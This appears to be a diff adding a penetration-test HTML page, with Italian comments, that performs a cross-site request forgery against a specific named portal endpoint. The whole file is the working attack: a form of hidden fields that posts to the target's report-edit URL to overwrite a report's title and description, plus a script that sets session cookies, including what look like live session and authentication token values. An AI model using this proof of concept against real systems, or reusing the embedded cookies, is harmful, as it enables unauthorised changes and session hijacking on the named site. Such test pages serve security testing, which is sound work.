@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test</title>
+</head>
+<body>
+    <h1>CSRF Test</h1>
+    <!-- Il form invia una richiesta POST all'URL specificato -->
+    <form action="https://test001-portal.vittoriarms.eu/ImpReports/Edit" method="POST">
+        <!-- Input hidden per i dati della richiesta -->
+        <input type="hidden" name="OperationType" value="1">
+        <input type="hidden" name="Role" value="null">
+        <input type="hidden" name="Guid" value="de921ad4-00fc-4de9-984b-84f73cffb5d4">
+        <input type="hidden" name="IsPortalAdmin" value="false">
+        <!-- ... altri campi hidden ... -->
+        <!-- Campi modificati per l'attacco CSRF -->
+        <input type="hidden" name="Item[ImpReport_Title]" value="CSRF-ALERT!!!">
+        <input type="hidden" name="Item[ImpReport_Description]" value="CSRF-ALERT!!! ">
+        <!-- ... altri campi hidden ... -->
+        <!-- Pulsante di invio del form -->
+        <input type="submit" value="Submit">
+    </form>
+
+    <!-- Script per impostare i cookie di sessione -->
+    <script>
+        // Imposta i cookie di sessione (esempio)
+        document.cookie = "ASP.NET_SessionId=bkuj4j2amx1k455fuxnrtnco; path=/";
+        document.cookie = "cookiebar=CookieAllowed; path=/";
+        document.cookie = "SO=FnkLte1e5TjVO5zZFxu4SQ==%ZSG7nFMkoBm5z1dUVlsy1XX/aDPU83OHVXekvXzy8x1TrJcX/iXYA/NhvhWei17PsO6GpkF75bATQZ+4ky4MQSLoOHHKHVD0nJOGQYiPN+1IbCD1W17tP/tzow7lkqgVJ3amTjZ1cugyPAR0VpDFz+8Obo3OWTB6K/8pbVofY6K0bA4p2EXtSmLJ819yVVKw; path=/";
+    </script>
+</body>
+</html>
